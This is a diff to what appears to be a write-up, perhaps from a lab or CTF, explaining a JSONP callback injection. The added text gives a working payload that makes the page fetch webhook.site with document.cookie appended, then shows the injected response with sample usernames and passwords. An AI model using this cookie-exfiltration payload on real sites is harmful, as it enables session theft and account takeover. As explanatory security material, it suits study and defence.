@@ -127,7 +127,30 @@ function login(data) { // Data from the other website passed into function.
         document.cookie = "LOGGED_IN_OR_SOMETHING";
     }
 
-}```
+}
+```
+
+---
+
+Because the JSONP is just arbitrarily inserted into this javascript function.
+
+It is just permanently vulnerable to anything... 
+
+Just do 
+
+`/jsonp?callback=fetch("https://webhook.site"%2Bdocument.cookie)\/\/`
+
+Which then returns 
+
+```javascript
+fetch("https://webhook.site"%2Bdocument.cookie) \/\/([
+{username:"jesse",password:"epicgamer123"}
+{username:"melon",password:"ismellreallybad"}
+{username:"george",password:"thanksforwatching!"}
+])
+```
+
+We have arbitrary javascript execution.
 
 ---
 
